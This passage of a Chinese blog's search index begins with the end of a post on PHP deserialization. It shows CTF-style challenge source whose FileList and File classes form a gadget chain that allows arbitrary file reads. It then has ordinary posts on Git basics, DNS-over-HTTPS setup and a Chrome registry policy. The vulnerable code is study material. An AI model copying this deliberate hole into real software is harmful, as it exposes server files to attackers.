WHERE `username` = ?;"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">"s"</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">"."</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">".."</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) {</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>{</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) {</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) {</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) {</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) {</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">'&lt;td class="text-center"&gt;'</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;td class="text-center" filename="'</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅略了解团队协作必须的 Git 的使用</title>
      <link href="/posts/79216.html"/>
      <url>/posts/79216.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="git-能做什么"><a class="markdownIt-Anchor" href="#git-能做什么"></a> Git 能做什么？</h2><p>Git 是一个分布式版本控制工具，主要用于管理文件。学习 Git 之后可以实现：</p><ul><li>代码回溯</li><li>版本切换</li><li>多人协作</li><li>远程备份</li></ul><h2 id="什么是本地仓库远程仓库"><a class="markdownIt-Anchor" href="#什么是本地仓库远程仓库"></a> 什么是本地仓库？远程仓库？</h2><p>本地仓库和远程仓库都可以顾名思义。当在本地创建了一个本地仓库之后，可以选择不推送到远程，这样也能实现本地文件的版本控制，当推送到远程仓库之后就可以免除换电脑的烦恼，且多人协作也可以流畅进行。</p><h2 id="git-全局配置"><a class="markdownIt-Anchor" href="#git-全局配置"></a> Git 全局配置</h2><p>安装 Git 只需找到官网然后一路下一步即可。</p><p>在安装之后可以将 git 加入环境变量方便使用，然后我们进行全局配置：配置用户名和 email 地址。之后的每次 Git 提交都会使用此配置信息。</p><p>在 Git 命令行中执行以下命令</p><ul><li>设置用户信息 </li></ul><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">"Your Name"</span></span><br><span class="line">git config --global user.email <span class="string">"Your Email Address"</span></span><br></pre></td></tr></tbody></table></figure><ul><li>查看配置信息</li></ul><p>配置好上面的信息后执行下面的命令进行检查</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></tbody></table></figure><blockquote><p>注：上面设置的用户信息的 <a href="http://user.name">user.name</a> 和 user.email 并不一定要注册仓库的账号名和邮箱地址</p></blockquote><h2 id="git-命令"><a class="markdownIt-Anchor" href="#git-命令"></a> Git 命令</h2><h3 id="本地仓库"><a class="markdownIt-Anchor" href="#本地仓库"></a> 本地仓库</h3><ol><li>在任意目录下创建一个空目录（如 repo1）作为本地 Git 仓库</li><li>进入这个目录中，Git bash here</li><li> 执行命令 <code>git init</code></li></ol><p>如果在当前目录中可找到<code>.git</code> 文件夹（此文件夹为隐藏文件夹）则说明 Git 仓库创建成功</p><p>除了上述方法生成本地仓库，还可以克隆 <code>git clone repoAddress</code> 远程仓库到本地，这样也能拥有一个本地仓库，注意一个目录下只能存在一个仓库，且不用再准备一个空的目录，因为克隆下来的仓库会将仓库封装到以仓库名为名字的文件夹下</p><h4 id="常用命令"><a class="markdownIt-Anchor" href="#常用命令"></a> 常用命令</h4><table><thead><tr><th style="text-align:left">git status</th><th style="text-align:left"> 查看文件状态</th></tr></thead><tbody><tr><td style="text-align:left"> git add</td><td style="text-align:left"> 将文件的修改加入暂存区</td></tr><tr><td style="text-align:left"> git reset</td><td style="text-align:left"> 将暂存区的文件取消暂存或者是切换到指定的版本 git reset --hard version</td></tr><tr><td style="text-align:left">git commit</td><td style="text-align:left"> 将暂存区的文件修改提交到版本库</td></tr><tr><td style="text-align:left"> git log</td><td style="text-align:left"> 查看日志</td></tr></tbody></table><h4 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h4><blockquote><p>看到克隆或创建的仓库的<code>.git</code> 文件夹你可能会好奇这到底是什么？</p></blockquote><ul><li>版本库：其实该<code>.git</code> 文件夹就是版本库，版本库汇总存储了很多配置信息、日志信息、文件版本信息等</li><li>工作区：包含<code>.git</code> 文件夹的目录就是工作区，也成为工作目录，主要存放开发的代码文件</li><li>暂存区：<code>.git</code> 文件夹文件夹中有很多文件，当你新增一个文件（如 1.txt）与.git 文件夹同级，此时 <code>1.txt</code> 已经在工作区，但他还未被 Git 进行版本管理，Git 进行版本控制的流程为：<mark>工作区 -&gt; 暂存区 -&gt; 版本库</mark>。<br>所以此时要进行 <code>git add fileName1 filename2 ...</code> 操作将其添加到暂存区，此操作将会使得<code>.git</code> 目录下出现一个 <code>index</code> 文件，也可以叫做 stage，也就是暂存区了。<br>然后执行 <code>git commit -m "HintMsg" fileName</code> 即可将其提交到版本库中进行管理</li></ul><blockquote><p>那么工作区那么多文件，我该如何分辨哪些是被版本控制的哪些没有呢？</p></blockquote><p>Git 工作区中的文件存在两种状态：</p><ul><li>untracked 未跟踪（未被纳入版本控制）</li><li>tracked 已跟踪 （已被纳入版本控制）<ul><li>Unmodified 为修改状态</li><li> Modified 已修改状态</li><li> Staged 已暂存状态</li></ul></li></ul><p>可以执行指令 <code>git status</code> 查看当前仓库是否存在可提交的文件，并展示文件状态</p><p>注意：当一个文件已经被 tracked，之后只是进行了修改，是无需重新进行 <code>git add</code> 操作的，可以直接 commit，未被 commit 前它的状态是 Modified 属于 tracked 当中，可使用上述命令查看验证。</p><h3 id="远程仓库"><a class="markdownIt-Anchor" href="#远程仓库"></a> 远程仓库</h3><table><thead><tr><th style="text-align:left">git remote</th><th style="text-align:left"> 查看远程仓库，查看详细信息 git remote -v</th></tr></thead><tbody><tr><td style="text-align:left">git remote add <shortname> <url></url></shortname></td><td style="text-align:left">添加本地仓库关联的远程仓库，shortName 为别名一般为 origin</td></tr><tr><td style="text-align:left">git clone</td><td style="text-align:left"> 从远程仓库克隆</td></tr><tr><td style="text-align:left"> git pull</td><td style="text-align:left"> 从远程仓库拉取</td></tr><tr><td style="text-align:left"> git push <shorname> branchName</shorname></td><td style="text-align:left"> 推送到远程仓库</td></tr></tbody></table><h2 id="git-分支"><a class="markdownIt-Anchor" href="#git-分支"></a> Git 分支</h2><p>分支是 Git 使用过程中非常重要的概念。使用分支意味着你可以把你的工作从开发主线上分离开来，以免影响开发主线。<br>同一个仓库可以有多个分支，各个分支相互独立，互不干扰。<br>通过 <code>git init </code>命令创建本地仓库时默认会创建一个 master 分支。</p><table><thead><tr><th style="text-align:left">git branch</th><th style="text-align:left"> 查看分支，-r 列出所有远程分支，-a 列出所有本地分支和远程分支</th></tr></thead><tbody><tr><td style="text-align:left"> git branch [name]</td><td style="text-align:left"> 创建分支</td></tr><tr><td style="text-align:left"> git checkout [name]</td><td style="text-align:left"> 切换分支</td></tr><tr><td style="text-align:left"> git push [shortName] [name]</td><td style="text-align:left"> 推送至远程仓库分支</td></tr><tr><td style="text-align:left"> git merge [name]</td><td style="text-align:left"> 合并分支，将指定分支合并至当前分支</td></tr><tr><td style="text-align:left"> git branch -d [name]</td><td style="text-align:left"> 删除分支</td></tr></tbody></table><h2 id="git-标签"><a class="markdownIt-Anchor" href="#git-标签"></a> Git 标签</h2><p>GIt 标签类似快照，存储着某一时刻的代码内容、状态等。可类比为版本号 v1.0、v2.0 等</p><table><thead><tr><th style="text-align:left">git tag</th><th style="text-align:left"> 列出已有的标签</th></tr></thead><tbody><tr><td style="text-align:left"> git tag [name]</td><td style="text-align:left"> 创建标签</td></tr><tr><td style="text-align:left"> git push [shortName] [name]</td><td style="text-align:left"> 将标签推送到远程仓库</td></tr><tr><td style="text-align:left"> git checkout -b [branch] [name]</td><td style="text-align:left"> 检出标签</td></tr></tbody></table><blockquote><p>注意：检出标签必须使用 - b 指定检出的分支名，由于标签不是分支，所以切换到某个标签只能将其检出为一个分支，如：<code>git checkout -b bv1 v1.0</code></p></blockquote><h2 id="git-idea-配置"><a class="markdownIt-Anchor" href="#git-idea-配置"></a> Git &amp; IDEA 配置</h2><p>打开 IDEA 的设置，找到版本控制（Version Control）-&gt;Git，将 Git 的本地可执行文件路径（Path to Git executable）补充正确，如果自动检测可用也是可以的，点击右边的测试（Test）如果出现 Git 的版本号就可以，别忘了点击应用</p><p>之后只需要在一个打开的项目中，点击 IDEA 上方导航栏的 VCS-&gt; 创建 Git 仓库（Create Git Repository），选择你要进行管理的项目父文件夹，如：demo-project 下有 src、pom.xml 等文件，就可以选择 demo-project 作为仓库文件夹，<code>.git</code> 版本库会出现在和 src 同级的目录中。此后 VCS 就会变成 Git 了。</p><p>注：IDEA 已帮你省略 add 到暂存区的操作，可以直接选择要提交的文件进行 commit 即可</p><p>当你进行 commit 操作时可能会出现显示可提交的文件的视图而不是我们常看到的目录 - 文件等结构，这时你可以点击上方的小按钮进行选择，选择目录即可</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20240626203148193.png" alt="image-20240626203148193"></p><p>在提交时，提交源码和必要的配置文件即可，无需提交字节码、target 文件夹等</p><p>那么文件那么多，我怎么选择性的提交呢？</p><p>这就是<code>.gitignore</code> 文件的作用之处了，这个文件可配置哪些文件是我们不需要进行提交的，例如：</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Maven #</span><br><span class="line">target/</span><br><span class="line"></span><br><span class="line"># IDEA #</span><br><span class="line">.idea/</span><br><span class="line">*.iml</span><br><span class="line"></span><br><span class="line"># Eclipse #</span><br><span class="line">.settings/</span><br><span class="line">.classpath</span><br><span class="line">.project</span><br></pre></td></tr></tbody></table></figure><p>带 <code>/</code> 的名字表示是一个文件夹而非文件</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 Windows 中启用 DOH 功能</title>
      <link href="/posts/46175.html"/>
      <url>/posts/46175.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><blockquote><p>适用环境：Windows11（Win10 可以开启浏览器的 DOH）<br>DNS 检测工具：<a href="https://www.nstool.netease.com/">网易 DNS 在线检测</a><br>参考文章：</p><ul><li>网络设置 DOH：<a href="https://zhuanlan.zhihu.com/p/590105276">Windows 11 22H2 开启 DoH（DNS over HTTPS）</a></li><li>检测：<a href="https://wkings.blog/archives/1253">DNS、DoT、DoH 协议测试方法</a></li></ul></blockquote><h2 id="google-浏览器和-firefox-浏览器启用-doh"><a class="markdownIt-Anchor" href="#google-浏览器和-firefox-浏览器启用-doh"></a> Google 浏览器和 Firefox 浏览器启用 DOH</h2><blockquote><p>Google 浏览器版本：123.0.6312.86（正式版本） （64 位）<br>Firefox 浏览器版本：123.0.1 (64 位)</p></blockquote><h2 id="google-浏览器"><a class="markdownIt-Anchor" href="#google-浏览器"></a> Google 浏览器</h2><p>找到<code>设置-&gt;隐私和安全-&gt;安全-&gt;高级</code>在高级区启用使用安全 DNS，并填写 DNS 提供商即可。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32753108/1711905304052-6ab911ae-a57d-433f-9295-726ca12cf59d.png#averageHue=%2325272b&amp;clientId=u46ce7476-c18b-4&amp;from=paste&amp;height=542&amp;id=u7e72b470&amp;originHeight=723&amp;originWidth=1437&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=76344&amp;status=done&amp;style=none&amp;taskId=u66ac412b-9daf-4157-97cb-359a6bb90d3&amp;title=&amp;width=1078" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/32753108/1711905398251-83fc3bce-72de-4982-b6fc-00fda7a52c36.png#averageHue=%232d2e31&amp;clientId=u46ce7476-c18b-4&amp;from=paste&amp;height=425&amp;id=u8e9fd09e&amp;originHeight=566&amp;originWidth=689&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=37874&amp;status=done&amp;style=none&amp;taskId=ud8be3634-e5fe-48df-9622-8b69db22293&amp;title=&amp;width=517" alt="image.png"><br>DNS 提供商填写<a href="https://zhuanlan.zhihu.com/p/590105276">网络设置 DOH</a> 这篇参考文章中的就好。<br>所有设置妥当之后请调用 cmd 输入 <code>ipconfig /flushdns</code> 该命令使得设置生效。</p><h2 id="firefox-浏览器"><a class="markdownIt-Anchor" href="#firefox-浏览器"></a> Firefox 浏览器</h2><p>在设置页面直接搜索 <code>dns</code> 即可。设置如图：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32753108/1711905924937-6e642b87-9294-4a5b-bcf4-567904db0425.png#averageHue=%23293741&amp;clientId=u46ce7476-c18b-4&amp;from=paste&amp;height=716&amp;id=ubbcb1742&amp;originHeight=955&amp;originWidth=683&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=64012&amp;status=done&amp;style=none&amp;taskId=ue1c01ceb-bcd1-4f4e-92bd-ca3db108d44&amp;title=&amp;width=512" alt="image.png"><br>DNS 提供商填写<a href="https://zhuanlan.zhihu.com/p/590105276">网络设置 DOH</a> 这篇参考文章中的就好。<br>所有设置妥当之后请调用 cmd 输入 <code>ipconfig /flushdns</code> 该命令使得设置生效。</p><h2 id="检测是否成功开启-doh"><a class="markdownIt-Anchor" href="#检测是否成功开启-doh"></a> 检测是否成功开启 DOH</h2><blockquote><p>涉及工具：<a href="https://dns.lookup.dog/#installation">dog 工具</a><br>协议：<br>-U, --udp Use the DNS protocol over UDP<br>-T, --tcp Use the DNS protocol over TCP<br>-S, --tls Use the DNS-over-TLS protocol<br>-H, --https Use the DNS-over-HTTPS protocol</p></blockquote><p>命令示例：<code>dog.exe -H @[https://dns.alidns.com/dns-query](https://dns.alidns.com/dns-query) bilibili.com</code></p><p>先写到这，想起什么了再补充。2024.4.1</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DOH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决谷歌浏览器问题：您的浏览器由贵组织托管解决</title>
      <link href="/posts/27484.html"/>
      <url>/posts/27484.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><p>参考：<a href="https://blog.csdn.net/w528_net/article/details/119839068">https://blog.csdn.net/w528_net/article/details/119839068</a></p><p>注册表地址：<code>计算机\HKEY_CURRENT_USER\SOFTWARE\Policies\Google\Chrome</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google浏览器 </tag>
            
            <tag> 谷歌浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
